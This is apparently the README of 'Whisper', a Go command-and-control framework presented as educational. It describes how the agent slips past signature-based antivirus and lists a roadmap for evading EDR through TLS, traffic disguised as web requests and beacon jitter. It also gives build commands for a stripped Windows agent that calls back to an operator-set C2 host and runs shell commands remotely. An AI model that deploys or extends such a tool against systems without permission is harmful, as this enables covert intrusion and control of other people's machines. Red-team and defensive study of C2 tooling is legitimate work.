# Whisper C2 Framework

![Status](https://img.shields.io/badge/status-proof%20of%20concept-brightgreen) [![Go Version](https://img.shields.io/badge/go-1.18+-00ADD8.svg)](https://go.dev/) [![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)

Whisper is a lightweight, TCP-based Command and Control (C2) framework built entirely in Go. It was developed for educational purposes to explore the fundamentals of C2 architecture and the challenges of evading modern security solutions.

This project serves as a practical tool for researchers, students, and cybersecurity professionals to understand offensive tooling in a controlled, ethical environment.

---

## ⚠️ Disclaimer

This project is intended **solely for educational and research purposes**. The goal is to study adversarial techniques to build better defensive strategies. The author is not responsible for any misuse or damage. **Use this tool ethically and only on systems you have explicit permission to test.**

---

## 🧠 Core Concepts: Bypassing Static vs. Dynamic Analysis

A key goal of this project is to understand how security products detect threats. The current version of Whisper can remain undetected by some basic antivirus (AV) solutions for two main reasons:

1.  **Unique Signature:** As a custom-coded tool, its file hash is not in any AV vendor's database of known malware. It bypasses **static analysis** because it has no recognized malicious signature.

2.  **Simple Behavior:** The agent's current actions (making a TCP connection, running a command) are not inherently malicious enough to trigger alarms in AV products that are not performing aggressive **behavioral analysis**.

The real challenge, and the future goal of this project, is to evade **Endpoint Detection and Response (EDR)** systems. An EDR actively monitors system behavior and would likely flag Whisper for:

* An unknown, unsigned program making a persistent network connection.
* An unusual parent-child process relationship (e.g., `agent.exe` spawning `whoami.exe`).

The roadmap below outlines the features needed to bypass this more advanced, behavior-based detection.

---

## ✨ Current Features

* **TCP-Based C2 Channel**: Simple and direct network communication between the agent and server.
* **Remote Command Execution**: Execute shell commands on a target machine via the agent.
* **Asynchronous Command Handling**: Built with Go's goroutines to manage multiple agents without blocking.
* **Cross-Platform Portability**: Easily cross-compile the agent for Windows, Linux, and macOS.

---

## 🗺️ The Road to True Stealth: Project Roadmap

The following features are planned to evolve Whisper from a simple C2 into a framework capable of evading more sophisticated, behavior-based security solutions.

* [X] **Encrypted C2 Channels (TLS):** Encrypt all traffic between the agent and server to prevent network inspection and hide commands.
* [X] **Malleable C2 Profiles:** Disguise C2 traffic to look like legitimate web traffic (e.g., HTTP/S POST requests) to blend in with normal network activity.
* [ ] **Sleep Obfuscation & Jitter:** Introduce randomized delays (jitter) to the agent's check-ins to make its beaconing pattern less predictable and harder to detect.

---


## 🛠️ Getting Started

### Prerequisites

* [Go](https://go.dev/doc/install) (Version 1.18 or higher)
* A basic understanding of networking and command-line interfaces.

### Installation and Setup

First, clone the repository to your local machine:


    git clone https://github.com/rahdian-abdi/whisper.git
    cd whisper


### **Option 1: Raw TCP Mode** 🔌

This is the simplest mode, using a direct, unencrypted TCP connection.

#### **Server Setup (Raw TCP)**

1.  **Navigate to the Server Directory:**
    ```bash
    cd server/rawtcp
    ```

2.  **Run the Server:**
    The server will start listening for incoming connections.
    ```bash
    go run main.go
    ```
    *(Note: For production use, build the binary first with `go build .`)*

#### **Agent Setup (Raw TCP)**

1.  **Navigate and Configure:**
    In a new terminal, go to the agent's directory.
    ```bash
    cd agent/rawtcp
    ```
    Open `main.go` and set the `c2Host` and `c2Port` variables to your server's IP and port.
    ```go
    // agent/rawtcp/main.go
    var (
        c2Host = "YOUR_C2_IP_HERE"
        c2Port = "8080"
    )
    ```

2.  **Build the Agent:**
    Compile the agent executable. This command creates a Windows binary and strips debug symbols to reduce its size.
    ```bash
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent_rawtcp.exe .
    ```

---

### **Option 2: HTTPS Mode (Malleable C2)** 🌐

This mode uses HTTPS for encrypted communication, making it stealthier.

#### **Server Setup (HTTPS)**

1.  **Navigate to the Server Directory:**
    ```bash
    cd server/https
    ```

2.  **Generate TLS Certificates:**
    The server requires a TLS certificate and key. The provided `openssl.conf` simplifies this process.
    ```bash
    # Create the directory to store certificates
    mkdir certs

    # Generate the certificate and key
    openssl req -new -x509 -config openssl.conf -keyout certs/c2.key -out certs/c2.crt -days 365 -nodes
    ```
    *Note: You can edit `openssl.conf` to change certificate details like the IP or domain name.*

    You can find the minimal setup of the `openssl.conf` below
    ```
    [req]
    distinguished_name = req_distinguished_name
    x509_extensions = v3_req
    prompt = no

    [req_distinguished_name]
    CN = YOUR_C2_SERVER_IP_HERE

    [v3_req]
    keyUsage = keyEncipherment, dataEncipherment
    extendedKeyUsage = serverAuth
    subjectAltName = @alt_names

    [alt_names]
    IP.1 = YOUR_C2_SERVER_IP_HERE
    ```

3.  **Run the Server:**
    ```bash
    go run main.go
    ```

#### **Agent Setup (HTTPS)**

1.  **Navigate and Configure:**
    In a new terminal, go to the agent's directory.
    ```bash
    cd agent/https
    ```
    Open `main.go` and set the `c2URL` variable to your server's full URL.
    ```go
    // agent/https/main.go
    c2URL := "https://YOUR_C2_IP_OR_DOMAIN"
    ```

2.  **Build the Agent:**
    Compile the agent executable for a Windows target.
    ```bash
    GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o agent_https.exe .
    ```

---

## 🖥️ Usage

1.  **Start Your Chosen Server:** Follow the setup steps to run either the `rawtcp` or `https` server.
2.  **Deploy the Agent:** Transfer the corresponding compiled agent (`agent_rawtcp.exe` or `agent_https.exe`) to a target machine you are authorized to test on and execute it.
3.  **Interact with the Agent:** When the agent connects, the server terminal will notify you and prompt for a command.
    ```
    [*] Whisper HTTPS C2 listening on https://0.0.0.0:443
    [whisper]> whoami
    [*] Sent to Agent: whoami

    [Agent Output] desktop-cej30mv\john
    ```

---

## 🤝 Contributing

Contributions, issues, and feature requests are welcome! Feel free to check the issues page for this repository to contribute.

---

## 📜 License

Distributed under the MIT License. See `LICENSE` for more information.